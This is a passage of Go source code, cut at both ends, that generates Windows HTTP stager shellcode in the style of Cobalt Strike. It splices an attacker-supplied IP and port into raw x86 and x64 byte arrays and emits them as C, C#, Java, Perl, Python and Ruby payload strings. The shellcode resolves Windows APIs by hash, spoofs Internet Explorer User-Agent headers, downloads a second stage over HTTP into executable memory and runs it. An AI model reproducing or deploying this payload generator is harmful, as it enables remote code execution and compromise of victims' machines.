0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x74, 0x31, 0x61, 0x56, 0x00, 0x52, 0xef, 0x2a, 0xe9, 0xc0, 0x00, 0xa9, 0xdf, 0xfc, 0x07, 0xee, 0xa0, 0x80, 0xdf, 0xc1, 0xf0, 0xbf, 0x96, 0xd7, 0x20, 0xb2, 0xe0, 0x6c, 0xd2, 0x89, 0xe4, 0x0f, 0x8d, 0xce, 0xdf, 0xe1, 0x46, 0xd8, 0xa8, 0x13, 0xd9, 0xbf, 0xd5, 0x41, 0x4f, 0x4c, 0xee, 0x77, 0xb7, 0x6b, 0xee, 0xd2, 0x40, 0xdc, 0x05, 0xa8, 0x42, 0x17, 0x01, 0x5a, 0xb9, 0xfd, 0xcd, 0xbc, 0xbd, 0x87, 0x21, 0x8d, 0xa4, 0x20, 0x2f, 0xed, 0xa6, 0xad, 0xe7, 0x26, 0x5a, 0x8f, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x38, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x34, 0x2e, 0x30, 0x3b, 0x20, 0x53, 0x4c, 0x43, 0x43, 0x32, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37, 0x29, 0x0d, 0x0a, 0x00, 0x09, 0xf7, 0x6e, 0xf6, 0x8e, 0x86, 0xb6, 0x37, 0xad, 0xde, 0x78, 0x09, 0x86, 0xf1, 0xc4, 0xb9, 0x72, 0xe1, 0x02, 0x48, 0x10, 0xa3, 0x80, 0x49, 0x8c, 0x88, 0x43, 0x73, 0x85, 0x52, 0x20, 0xfd, 0x43, 0xe6, 0x36, 0x3f, 0xbf, 0x6b, 0x06, 0x15, 0xdd, 0xea, 0x5b, 0x0d, 0x07, 0x92, 0x83, 0xe6, 0xde, 0x51, 0x4d, 0x0a, 0x66, 0x43, 0x0e, 0xdb, 0x37, 0xdd, 0x78, 0xcf, 0x49, 0x5e, 0x81, 0x50, 0x17, 0xe3, 0x45, 0x03, 0x12, 0xfd, 0xdd, 0x5a, 0x93, 0xde, 0x98, 0x76, 0xb9, 0x34, 0x69, 0xb8, 0x52, 0xc9, 0x57, 0xed, 0xdc, 0x87, 0xbc, 0x69, 0x0a, 0x6a, 0x65, 0xaa, 0xfa, 0xb0, 0x92, 0x4e, 0x26, 0x15, 0x3f, 0x5d, 0x16, 0xf5, 0x7a, 0xd0, 0x01, 0x6d, 0xd5, 0xa1, 0x3d, 0x6c, 0xcb, 0xcf, 0x33, 0x62, 0xba, 0xcf, 0x88, 0x71, 0xb2, 0x7d, 0x25, 0x7a, 0x11, 0xae, 0x59, 0x0b, 0x2a, 0x4f, 0x16, 0x28, 0xd3, 0xd0, 0xdf, 0xe6, 0xa3, 0x03, 0x96, 0xba, 0x30, 0x48, 0x15, 0xd5, 0x27, 0x92, 0xf2, 0x64, 0x2b, 0x68, 0x1a, 0x27, 0x1c, 0xe2, 0x5d, 0x9a, 0xa6, 0x23, 0xaf, 0xcd, 0x21, 0xd7, 0x3f, 0x8d, 0x1e, 0xe1, 0xb7, 0x2c, 0x12, 0xd0, 0x58, 0xd6, 0x3b, 0xbf, 0x72, 0xc1, 0x5e, 0xf4, 0x0b, 0xb3, 0xaf, 0x6e, 0x85, 0xeb, 0xb0, 0x9c, 0xf0, 0x34, 0x0e, 0x43, 0x1a, 0x99, 0x74, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Python = Python + fmt.Sprintf("0x%02x,", v)
	}
	Ruby := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x65, 0x58, 0x55, 0x4a, 0x00, 0x59, 0x6e, 0x8f, 0x38, 0x8a, 0x6f, 0xf2, 0x3f, 0xfa, 0x19, 0x25, 0x44, 0xa2, 0xc2, 0x5b, 0xb5, 0x8f, 0xb7, 0xe4, 0x99, 0x20, 0x5e, 0xd9, 0x82, 0x44, 0x88, 0x3b, 0x91, 0xd3, 0x62, 0xaf, 0x66, 0x58, 0x93, 0xb3, 0x10, 0x00, 0x00, 0xc5, 0xc5, 0xcf, 0x56, 0x90, 0x2f, 0xa6, 0x84, 0x6f, 0x92, 0x9b, 0x76, 0x3a, 0x48, 0x9e, 0x52, 0xe4, 0xe4, 0xf5, 0x78, 0x19, 0x9d, 0xad, 0x69, 0xea, 0xbe, 0x61, 0x1f, 0x47, 0x87, 0xcb, 0x1c, 0x3e, 0xbf, 0x92, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x42, 0x4f, 0x49, 0x45, 0x39, 0x3b, 0x50, 0x54, 0x42, 0x52, 0x29, 0x0d, 0x0a, 0x00, 0x09, 0x6b, 0x8e, 0x27, 0x5b, 0x54, 0x47, 0xba, 0x1a, 0xbf, 0x27, 0xd4, 0xbd, 0x1b, 0xd8, 0x77, 0x59, 0x4f, 0x6d, 0xce, 0x4f, 0x9d, 0xb2, 0x65, 0x8c, 0x13, 0x39, 0x2c, 0x3f, 0x9b, 0xb4, 0x30, 0x38, 0xf3, 0x13, 0xfc, 0xe9, 0x59, 0x91, 0x9a, 0xa6, 0x82, 0xe8, 0xe6, 0x7a, 0x3c, 0xb3, 0xc3, 0x74, 0x05, 0xcc, 0xd2, 0x37, 0xf9, 0x74, 0xe9, 0x68, 0xc0, 0x4c, 0x5d, 0xbc, 0x4d, 0x56, 0xda, 0xde, 0x37, 0x66, 0xc7, 0x2a, 0x29, 0x2f, 0x58, 0x2d, 0x6c, 0x2d, 0x06, 0x86, 0xe8, 0x67, 0xbd, 0xb8, 0xbb, 0x35, 0x02, 0x88, 0x31, 0x2d, 0x95, 0xd5, 0xb2, 0x5a, 0x7c, 0x78, 0xf6, 0x20, 0x47, 0x36, 0x24, 0xac, 0x48, 0xb1, 0xe3, 0xe7, 0xca, 0xc1, 0xac, 0xa1, 0x69, 0x00, 0xcb, 0xbd, 0x3c, 0xa3, 0x35, 0x83, 0xc7, 0x1c, 0xc1, 0x63, 0xc1, 0x55, 0x58, 0x00, 0x67, 0xc7, 0x88, 0x9f, 0x1c, 0x00, 0xde, 0xf4, 0x25, 0x14, 0x2a, 0x6d, 0x3c, 0x66, 0x22, 0xaa, 0xa0, 0x7e, 0x38, 0x8c, 0x7a, 0x6f, 0x9b, 0xe1, 0x64, 0x79, 0x88, 0xca, 0x70, 0x6f, 0x17, 0xb8, 0x8c, 0x33, 0x94, 0x81, 0xbf, 0x84, 0xaa, 0xa2, 0x57, 0xb8, 0x9a, 0xbd, 0xb8, 0xb9, 0x00, 0x5c, 0xc1, 0xa4, 0x31, 0xef, 0x9c, 0x0b, 0x22, 0x84, 0xdc, 0xed, 0x6e, 0x5f, 0xb9, 0x1c, 0x40, 0xac, 0x88, 0x80, 0x2b, 0x03, 0x56, 0x16, 0x13, 0x8e, 0x6d, 0xc6, 0x7d, 0xf9, 0x53, 0x2d, 0x6c, 0xb0, 0xd0, 0xb2, 0x6b, 0x12, 0xf5, 0xb2, 0xfb, 0x3f, 0x67, 0xc6, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Ruby = Ruby + fmt.Sprintf("0x%02x,", v)
	}

	return CS_Shellcode{
		C,
		Cs,
		Java,
		Perl,
		Python,
		Ruby,
	}
}

func CS_Http_Shellcode64(ip string, port string) CS_Shellcode {
	port_int, _ := strconv.Atoi(port)
	port_byte := Port_byte_rec_IntToBytes(port_int)
	ip_byte := []byte(ip)
	fmt.Printf("%#v\n\n\n\n", ip_byte)
	head := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xeb, 0x73, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8}
	C := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x4e, 0x34, 0x79, 0x00, 0x3b, 0x7a, 0x28, 0x46, 0x2a, 0x69, 0x2c, 0xf7, 0x14, 0xe2, 0x22, 0x24, 0xfe, 0xc0, 0x23, 0xac, 0xcb, 0x78, 0xef, 0x52, 0xd9, 0xcf, 0x89, 0xcf, 0x4d, 0x2b, 0x58, 0x8a, 0x06, 0x9f, 0x92, 0x54, 0x20, 0x49, 0x9e, 0x13, 0xf9, 0x8e, 0x56, 0xab, 0x50, 0xb5, 0x82, 0xe5, 0x61, 0xe4, 0xdf, 0xbe, 0x25, 0x10, 0xf1, 0xa6, 0x34, 0xb3, 0x14, 0x29, 0x82, 0xd8, 0xe1, 0x89, 0x4a, 0x87, 0x82, 0x79, 0x88, 0x7c, 0x24, 0x57, 0xe1, 0x49, 0xc9, 0xe5, 0x33, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x38, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x34, 0x2e, 0x30, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, 0x31, 0x2e, 0x31, 0x2e, 0x34, 0x33, 0x32, 0x32, 0x3b, 0x20, 0x42, 0x4f, 0x49, 0x45, 0x38, 0x3b, 0x45, 0x4e, 0x55, 0x53, 0x29, 0x0d, 0x0a, 0x00, 0xc0, 0xc3, 0x8d, 0x65, 0x38, 0xca, 0x0c, 0x93, 0xc0, 0xbd, 0xf5, 0x27, 0xdc, 0xdb, 0x12, 0xe5, 0xef, 0x3b, 0xfe, 0xc4, 0x43, 0x2c, 0x7a, 0xb1, 0x0e, 0xba, 0x25, 0x17, 0x96, 0xd3, 0xb3, 0xbb, 0xde, 0xf7, 0x3d, 0x47, 0x10, 0xeb, 0x63, 0x04, 0xc0, 0x7f, 0x4a, 0xbb, 0xda, 0x0b, 0x71, 0x9e, 0x5b, 0xba, 0xeb, 0x87, 0x01, 0x53, 0xc0, 0x13, 0xa5, 0x2a, 0xfc, 0x2e, 0x8c, 0xbc, 0x12, 0xcf, 0x18, 0xc5, 0xc8, 0x33, 0xa6, 0x40, 0xe8, 0xd0, 0xf2, 0x5f, 0xa9, 0xca, 0xb4, 0xb9, 0x61, 0xa1, 0xcd, 0x8d, 0x50, 0x1c, 0x31, 0xb8, 0xdd, 0x69, 0x0c, 0xb2, 0xa1, 0xd6, 0xf1, 0xc9, 0xcf, 0x5a, 0xec, 0xb5, 0xab, 0x24, 0x46, 0x83, 0xe5, 0x49, 0x5c, 0xd8, 0xe8, 0x35, 0x35, 0xd8, 0x75, 0x87, 0x96, 0x57, 0x6a, 0x17, 0x3a, 0x6b, 0xa3, 0x7a, 0x2b, 0x28, 0xc2, 0xae, 0x2a, 0x62, 0x0d, 0xcc, 0x7e, 0x29, 0x2c, 0x9e, 0xe6, 0x38, 0x76, 0xfe, 0x92, 0x9a, 0xc5, 0x2c, 0xc1, 0x68, 0xf7, 0x84, 0x33, 0xd2, 0x74, 0xa7, 0xcb, 0x41, 0x0d, 0x0f, 0x2f, 0x24, 0xaa, 0x22, 0xed, 0xb2, 0xfb, 0x18, 0xac, 0x33, 0x11, 0xab, 0x77, 0x50, 0x2c, 0xaf, 0xdc, 0x33, 0xf0, 0x4f, 0xce, 0xe1, 0x27, 0x1a, 0x5b, 0x2e, 0x9d, 0xd7, 0x2b, 0x93, 0x65, 0x38, 0xfd, 0x04, 0xbc, 0x53, 0x22, 0xd8, 0xc4, 0x46, 0xe0, 0x0c, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		C = C + fmt.Sprintf("0x%02x,", v)
	}
	Cs := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x31, 0x73, 0x58, 0x61, 0x00, 0xdf, 0xd1, 0xed, 0xdd, 0x80, 0x98, 0x87, 0x2a, 0x58, 0x47, 0x90, 0xeb, 0xf1, 0x10, 0x72, 0x30, 0x2a, 0x57, 0xb6, 0x2e, 0xd1, 0x10, 0x0f, 0x73, 0x61, 0xc9, 0x12, 0x67, 0xa8, 0xa7, 0x55, 0x64, 0x61, 0x01, 0xa9, 0xef, 0xb1, 0x44, 0x9f, 0x45, 0x59, 0x81, 0xe5, 0x2a, 0x05, 0xa7, 0x24, 0x48, 0xa0, 0xb8, 0x59, 0xaf, 0xa9, 0xa2, 0x38, 0x3e, 0x5a, 0xfd, 0x34, 0x7f, 0x53, 0x73, 0x97, 0x96, 0xa2, 0x96, 0x25, 0x35, 0xde, 0x58, 0x4f, 0x76, 0x7e, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x79, 0x69, 0x65, 0x39, 0x29, 0x0d, 0x0a, 0x00, 0x49, 0xe3, 0x48, 0x7e, 0xa8, 0x54, 0xa4, 0x9d, 0x64, 0x7f, 0xf3, 0xfa, 0xcd, 0xf5, 0x81, 0x57, 0x77, 0xf1, 0x79, 0xf4, 0x8f, 0xfd, 0xa7, 0xfd, 0xc6, 0x22, 0xc2, 0x62, 0x23, 0x97, 0x0c, 0x32, 0xee, 0xf3, 0x04, 0x52, 0x67, 0x38, 0x7f, 0x98, 0x72, 0xd0, 0x40, 0x86, 0xbd, 0xee, 0x8c, 0xc7, 0x3b, 0x7b, 0xbf, 0x15, 0xe9, 0xfd, 0x72, 0xfb, 0x20, 0xfa, 0x6b, 0x11, 0x6b, 0x4f, 0x14, 0x50, 0xb9, 0x17, 0xaf, 0x32, 0x60, 0x31, 0x2b, 0x22, 0x3b, 0x50, 0x6f, 0x10, 0x3e, 0x28, 0x6f, 0xac, 0x2b, 0x9f, 0x10, 0x65, 0xf9, 0x5d, 0xe7, 0x6a, 0x06, 0x62, 0xd3, 0x61, 0xa5, 0x15, 0xf1, 0x05, 0x25, 0xd2, 0x57, 0x4f, 0x49, 0x0c, 0x31, 0x78, 0x63, 0xca, 0x53, 0x45, 0x55, 0xae, 0x70, 0x59, 0x77, 0x0f, 0xc3, 0x52, 0xa2, 0x94, 0x9e, 0xb6, 0x67, 0x80, 0xfd, 0xdb, 0x44, 0x0d, 0x87, 0x8a, 0x3f, 0x2f, 0xc9, 0x98, 0x61, 0x9b, 0x79, 0xd4, 0x73, 0x12, 0x7d, 0x36, 0xd9, 0xc9, 0x98, 0x14, 0xd9, 0xf9, 0x2a, 0xd0, 0xa9, 0xe6, 0x30, 0xcb, 0x27, 0xa5, 0xe4, 0x75, 0x6c, 0x1d, 0xf1, 0x3f, 0xbc, 0x7b, 0xc3, 0x6d, 0xc8, 0x6c, 0x1a, 0xfd, 0x3e, 0xd4, 0x2e, 0xfb, 0x44, 0xbe, 0x35, 0xba, 0x34, 0x84, 0xbd, 0xaf, 0x24, 0x0f, 0x31, 0xae, 0xd7, 0xed, 0xf7, 0x48, 0xa2, 0xc7, 0xbf, 0x2f, 0x32, 0x45, 0xbc, 0x6c, 0x8d, 0xa9, 0x16, 0xb9, 0x81, 0x73, 0x73, 0x56, 0x3d, 0x15, 0x5b, 0xf8, 0x01, 0x9e, 0x98, 0x38, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Cs = Cs + fmt.Sprintf("0x%02x,", v)
	}
	Java := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x4a, 0x66, 0x57, 0x56, 0x00, 0xf1, 0xb6, 